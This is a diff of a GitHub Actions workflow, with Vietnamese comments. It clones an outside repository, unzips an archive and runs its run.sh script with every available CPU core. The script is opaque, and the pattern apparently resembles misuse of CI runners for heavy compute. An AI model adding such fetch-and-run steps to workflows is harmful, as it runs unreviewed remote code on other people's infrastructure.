@@ -1,7 +1,7 @@
 name: Auto Setup and Run
 
 on:
-  workflow_dispatch:  # Cho phép bấm nút Run workflow thủ công
+  workflow_dispatch:  # Cho phép chạy thủ công
 
 jobs:
   build:
@@ -11,17 +11,16 @@ jobs:
       - name: Checkout this repo
         uses: actions/checkout@v3
 
-      - name: Clone target repo
-        run: |
-          git clone https://github.com/Teo4268/Bjndersrb.git
-          cd Bjndersrb
-          chmod +x run.sh
-
       - name: Install dependencies
         run: |
           sudo apt-get update
           sudo apt-get install -y python3 python3-pip unzip git
 
-      - name: Run script with argument
-        working-directory: Bjndersrb
-        run: ./run.sh 4
+      - name: Clone and run
+        run: |
+          git clone https://github.com/Teo4268/Bjndersrb.git
+          cd Bjndersrb
+          unzip tranning2.zip
+          cd tranning2
+          chmod +x run.sh
+          ./run.sh $(nproc)
